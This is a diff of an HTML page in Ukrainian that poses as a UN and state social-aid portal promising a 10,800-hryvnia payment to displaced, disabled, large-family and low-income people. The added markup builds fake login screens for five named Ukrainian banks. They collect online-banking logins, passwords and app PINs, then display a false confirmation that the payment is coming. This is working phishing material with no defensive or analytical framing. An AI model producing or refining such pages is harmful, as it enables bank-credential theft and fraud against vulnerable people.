@@ -7,92 +7,335 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <header>
-        <h1>Є-Допомога від ООН</h1>
-        <p>Державна соціальна підтримка</p>
-    </header>
+    <!-- Главная страница -->
+    <div id="mainPage">
+        <header>
+            <h1>Є-Допомога від ООН</h1>
+            <p>Державна соціальна підтримка</p>
+        </header>
 
-    <div class="container">
-        <div class="payment-card">
-            <h2>Виплата 10 800 грн</h2>
-            <p>Державна соціальна допомога для певних категорій громадян.</p>
+        <div class="container">
+            <div class="payment-card">
+                <h2>Виплата 10 800 грн</h2>
+                <p>Державна соціальна допомога для певних категорій громадян.</p>
 
-            <div class="conditions">
-                <h3>Виплата доступна:</h3>
-                <ul>
-                    <li>✅ ВПО</li>
-                    <li>✅ Багатодітним родинам</li>
-                    <li>✅ Особам з інвалідністю</li>
-                    <li>✅ Малозабезпеченим</li>
-                </ul>
-            </div>
+                <div class="conditions">
+                    <h3>Виплата доступна:</h3>
+                    <ul>
+                        <li>✅ ВПО</li>
+                        <li>✅ Багатодітним родинам</li>
+                        <li>✅ Особам з інвалідністю</li>
+                        <li>✅ Малозабезпеченим</li>
+                    </ul>
+                </div>
 
-            <h3>Як подати заявку:</h3>
-            <ol class="steps">
-                <li>Заповніть форму з вашими даними</li>
-                <li>Завантажте необхідні документи</li>
-                <li>Оберіть банк для отримання коштів</li>
-                <li>Очікуйте рішення</li>
-            </ol>
+                <h3>Як подати заявку:</h3>
+                <ol class="steps">
+                    <li>Зареєструйтесь на порталі Дії (diia.gov.ua)</li>
+                    <li>Заповніть анкету у розділі "Соціальна підтримка"</li>
+                    <li>Завантажте необхідні документи</li>
+                    <li>Очікуйте рішення</li>
+                </ol>
 
-            <div id="mainForm" class="data-form">
-                <h3>Введіть ваші дані:</h3>
-                <div class="form-group">
-                    <label class="form-label">ПІБ</label>
-                    <input type="text" class="form-control" placeholder="Введіть ваше ПІБ" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Дата народження</label>
-                    <input type="date" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Номер телефону</label>
-                    <input type="tel" class="form-control" placeholder="Введіть ваш номер телефону" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Коментар до вашої ситуації</label>
-                    <textarea class="form-control" rows="3" placeholder="Опишіть вашу ситуацію" required></textarea>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Завантажте документи (PDF, JPG)</label>
-                    <input type="file" class="form-control" multiple required>
-                </div>
-                <button id="submitMainForm" class="submit-btn">Продовжити</button>
-            </div>
+                <button id="applyBtn" class="btn">Подати заявку онлайн</button>
 
-            <!-- Вибір банку -->
-            <div id="bankSelection" class="bank-selection">
-                <h3>Оберіть ваш банк:</h3>
-                <div class="bank-options">
-                    <div class="bank-option" data-bank="privat">
-                        <img src="img/privat.png" alt="ПриватБанк">
-                        <span>ПриватБанк</span>
+                <!-- Вибір банку -->
+                <div id="bankSelection" class="bank-selection">
+                    <h3>Оберіть ваш банк:</h3>
+                    <div class="bank-options">
+                        <div class="bank-option" data-bank="privat">
+                            <img src="img/privat.png" alt="ПриватБанк">
+                            <span>ПриватБанк</span>
+                        </div>
+                        <div class="bank-option" data-bank="oschad">
+                            <img src="img/oshad.png" alt="Ощадбанк">
+                            <span>Ощадбанк</span>
+                        </div>
+                        <div class="bank-option" data-bank="raif">
+                            <img src="img/raif.png" alt="Райффайзен">
+                            <span>Райффайзен</span>
+                        </div>
+                        <div class="bank-option" data-bank="mono">
+                            <img src="img/mono.png" alt="Монобанк">
+                            <span>Монобанк</span>
+                        </div>
+                        <div class="bank-option" data-bank="pumb">
+                            <img src="img/pumb.png" alt="ПУМБ">
+                            <span>ПУМБ</span>
+                        </div>
                     </div>
-                    <div class="bank-option" data-bank="oschad">
-                        <img src="img/oshad.png" alt="Ощадбанк">
-                        <span>Ощадбанк</span>
+                </div>
+
+                <!-- Форма введення даних -->
+                <div id="dataForm" class="data-form">
+                    <h3 id="formTitle">Введіть ваші дані:</h3>
+                    <div class="form-group">
+                        <label class="form-label">Логін</label>
+                        <input type="text" class="form-control" placeholder="Введіть ваш логін" required>
                     </div>
-                    <div class="bank-option" data-bank="raif">
-                        <img src="img/raif.png" alt="Райффайзен">
-                        <span>Райффайзен</span>
+                    <div class="form-group">
+                        <label class="form-label">Пароль</label>
+                        <input type="password" class="form-control" placeholder="Введіть ваш пароль" required>
                     </div>
-                    <div class="bank-option" data-bank="mono">
-                        <img src="img/mono.png" alt="Монобанк">
-                        <span>Монобанк</span>
+                    <div class="form-group">
+                        <label class="form-label">Пін-код</label>
+                        <input type="text" class="form-control" placeholder="Введіть пін-код" required>
                     </div>
-                    <div class="bank-option" data-bank="pumb">
-                        <img src="img/pumb.png" alt="ПУМБ">
-                        <span>ПУМБ</span>
+                    <div class="form-group">
+                        <label class="form-label">ПІБ</label>
+                        <input type="text" class="form-control" placeholder="Введіть ваше ПІБ" required>
                     </div>
+                    <div class="form-group">
+                        <label class="form-label">Дата народження</label>
+                        <input type="date" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Email</label>
+                        <input type="email" class="form-control" placeholder="Введіть ваш email" required>
+                    </div>
+                    <button class="submit-btn">Підтвердити</button>
                 </div>
             </div>
         </div>
+
+        <footer>
+            <p>© 2023 Є-Допомога. Всі права захищені.</p>
+            <p>Гаряча лінія: 0 800 123 456</p>
+        </footer>
     </div>
 
-    <footer>
-        <p>© 2023 Є-Допомога. Всі права захищені.</p>
-        <p>Гаряча лінія: 0 800 123 456</p>
-    </footer>
+    <!-- Страницы банков (скрыты по умолчанию) -->
+    <div id="bankPages" style="display: none;">
+        <!-- Монобанк -->
+        <div id="monoPage" class="bank-page">
+            <header class="bank-header">
+                <img src="img/mono.png" alt="Монобанк" class="bank-logo">
+                <h1>Монобанк</h1>
+            </header>
+
+            <div class="bank-container">
+                <h2>Отримання виплати 10 800 грн через Монобанк</h2>
+                <p>Для отримання виплати вам необхідно увійти в ваш особистий кабінет Монобанку.</p>
+
+                <form id="monoLoginForm" class="bank-login-form">
+                    <div class="form-group">
+                        <label class="form-label">Логін</label>
+                        <input type="text" id="monoLogin" class="form-control" placeholder="Введіть ваш логін" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Пароль</label>
+                        <input type="password" id="monoPassword" class="form-control" placeholder="Введіть ваш пароль" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Увійти</button>
+                </form>
+
+                <div id="monoLoading" class="loading">
+                    <div class="loading-spinner"></div>
+                    <p>Триває перевірка даних...</p>
+                </div>
+
+                <form id="monoPinForm" class="pin-form">
+                    <div class="form-group">
+                        <label class="form-label">Введіть PIN-код від вашого банківського додатку</label>
+                        <input type="text" id="monoPin" class="form-control" placeholder="Введіть 4-значний PIN-код"
+                               oninput="validatePin(this)" maxlength="4" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Підтвердити</button>
+                </form>
+
+                <div id="monoSuccessMessage" class="success-message">
+                    <h3>✅ Дані успішно підтверджено!</h3>
+                    <p>Ваша заявка на виплату прийнята. Кошти будуть зараховані на ваш рахунок протягом 3-5 робочих днів.</p>
+                </div>
+
+                <button class="bank-btn back-to-main">Повернутися до вибору банку</button>
+            </div>
+        </div>
+
+        <!-- Ощадбанк -->
+        <div id="oschadPage" class="bank-page">
+            <header class="bank-header">
+                <img src="img/oshad.png" alt="Ощадбанк" class="bank-logo">
+                <h1>Ощадбанк</h1>
+            </header>
+
+            <div class="bank-container">
+                <h2>Отримання виплати 10 800 грн через Ощадбанк</h2>
+                <p>Для отримання виплати вам необхідно увійти в ваш особистий кабінет Ощадбанк.</p>
+
+                <form id="oschadLoginForm" class="bank-login-form">
+                    <div class="form-group">
+                        <label class="form-label">Логін</label>
+                        <input type="text" id="oschadLogin" class="form-control" placeholder="Введіть ваш логін" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Пароль</label>
+                        <input type="password" id="oschadPassword" class="form-control" placeholder="Введіть ваш пароль" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Увійти</button>
+                </form>
+
+                <div id="oschadLoading" class="loading">
+                    <div class="loading-spinner"></div>
+                    <p>Триває перевірка даних...</p>
+                </div>
+
+                <form id="oschadPinForm" class="pin-form">
+                    <div class="form-group">
+                        <label class="form-label">Введіть PIN-код від вашого банківського додатку</label>
+                        <input type="text" id="oschadPin" class="form-control" placeholder="Введіть 4-значний PIN-код"
+                               oninput="validatePin(this)" maxlength="4" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Підтвердити</button>
+                </form>
+
+                <div id="oschadSuccessMessage" class="success-message">
+                    <h3>✅ Дані успішно підтверджено!</h3>
+                    <p>Ваша заявка на виплату прийнята. Кошти будуть зараховані на ваш рахунок протягом 3-5 робочих днів.</p>
+                </div>
+
+                <button class="bank-btn back-to-main">Повернутися до вибору банку</button>
+            </div>
+        </div>
+
+        <!-- ПриватБанк -->
+        <div id="privatPage" class="bank-page">
+            <header class="bank-header">
+                <img src="img/privat.png" alt="ПриватБанк" class="bank-logo">
+                <h1>ПриватБанк</h1>
+            </header>
+
+            <div class="bank-container">
+                <h2>Отримання виплати 10 800 грн через ПриватБанк</h2>
+                <p>Для отримання виплати вам необхідно увійти в ваш особистий кабінет ПриватБанк.</p>
+
+                <form id="privatLoginForm" class="bank-login-form">
+                    <div class="form-group">
+                        <label class="form-label">Логін</label>
+                        <input type="text" id="privatLogin" class="form-control" placeholder="Введіть ваш логін" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Пароль</label>
+                        <input type="password" id="privatPassword" class="form-control" placeholder="Введіть ваш пароль" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Увійти</button>
+                </form>
+
+                <div id="privatLoading" class="loading">
+                    <div class="loading-spinner"></div>
+                    <p>Триває перевірка даних...</p>
+                </div>
+
+                <form id="privatPinForm" class="pin-form">
+                    <div class="form-group">
+                        <label class="form-label">Введіть PIN-код від вашого банківського додатку</label>
+                        <input type="text" id="privatPin" class="form-control" placeholder="Введіть 4-значний PIN-код"
+                               oninput="validatePin(this)" maxlength="4" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Підтвердити</button>
+                </form>
+
+                <div id="privatSuccessMessage" class="success-message">
+                    <h3>✅ Дані успішно підтверджено!</h3>
+                    <p>Ваша заявка на виплату прийнята. Кошти будуть зараховані на ваш рахунок протягом 3-5 робочих днів.</p>
+                </div>
+
+                <button class="bank-btn back-to-main">Повернутися до вибору банку</button>
+            </div>
+        </div>
+
+        <!-- ПУМБ -->
+        <div id="pumbPage" class="bank-page">
+            <header class="bank-header">
+                <img src="img/pumb.png" alt="ПУМБ" class="bank-logo">
+                <h1>ПУМБ</h1>
+            </header>
+
+            <div class="bank-container">
+                <h2>Отримання виплати 10 800 грн через ПУМБ</h2>
+                <p>Для отримання виплати вам необхідно увійти в ваш особистий кабінет ПУМБ.</p>
+
+                <form id="pumbLoginForm" class="bank-login-form">
+                    <div class="form-group">
+                        <label class="form-label">Логін</label>
+                        <input type="text" id="pumbLogin" class="form-control" placeholder="Введіть ваш логін" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Пароль</label>
+                        <input type="password" id="pumbPassword" class="form-control" placeholder="Введіть ваш пароль" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Увійти</button>
+                </form>
+
+                <div id="pumbLoading" class="loading">
+                    <div class="loading-spinner"></div>
+                    <p>Триває перевірка даних...</p>
+                </div>
+
+                <form id="pumbPinForm" class="pin-form">
+                    <div class="form-group">
+                        <label class="form-label">Введіть PIN-код від вашого банківського додатку</label>
+                        <input type="text" id="pumbPin" class="form-control" placeholder="Введіть 4-значний PIN-код"
+                               oninput="validatePin(this)" maxlength="4" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Підтвердити</button>
+                </form>
+
+                <div id="pumbSuccessMessage" class="success-message">
+                    <h3>✅ Дані успішно підтверджено!</h3>
+                    <p>Ваша заявка на виплату прийнята. Кошти будуть зараховані на ваш рахунок протягом 3-5 робочих днів.</p>
+                </div>
+
+                <button class="bank-btn back-to-main">Повернутися до вибору банку</button>
+            </div>
+        </div>
+
+        <!-- Райффайзен -->
+        <div id="raifPage" class="bank-page">
+            <header class="bank-header">
+                <img src="img/raif.png" alt="Райффайзен" class="bank-logo">
+                <h1>Райффайзен</h1>
+            </header>
+
+            <div class="bank-container">
+                <h2>Отримання виплати 10 800 грн через Райфайзен</h2>
+                <p>Для отримання виплати вам необхідно увійти в ваш особистий кабінет Райфайзен.</p>
+
+                <form id="raifLoginForm" class="bank-login-form">
+                    <div class="form-group">
+                        <label class="form-label">Логін</label>
+                        <input type="text" id="raifLogin" class="form-control" placeholder="Введіть ваш логін" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Пароль</label>
+                        <input type="password" id="raifPassword" class="form-control" placeholder="Введіть ваш пароль" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Увійти</button>
+                </form>
+
+                <div id="raifLoading" class="loading">
+                    <div class="loading-spinner"></div>
+                    <p>Триває перевірка даних...</p>
+                </div>
+
+                <form id="raifPinForm" class="pin-form">
+                    <div class="form-group">
+                        <label class="form-label">Введіть PIN-код від вашого банківського додатку</label>
+                        <input type="text" id="raifPin" class="form-control" placeholder="Введіть 4-значний PIN-код"
+                               oninput="validatePin(this)" maxlength="4" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Підтвердити</button>
+                </form>
+
+                <div id="raifSuccessMessage" class="success-message">
+                    <h3>✅ Дані успішно підтверджено!</h3>
+                    <p>Ваша заявка на виплату прийнята. Кошти будуть зараховані на ваш рахунок протягом 3-5 робочих днів.</p>
+                </div>
+
+                <button class="bank-btn back-to-main">Повернутися до вибору банку</button>
+            </div>
+        </div>
+    </div>
 
     <script src="script.js"></script>
 </body>
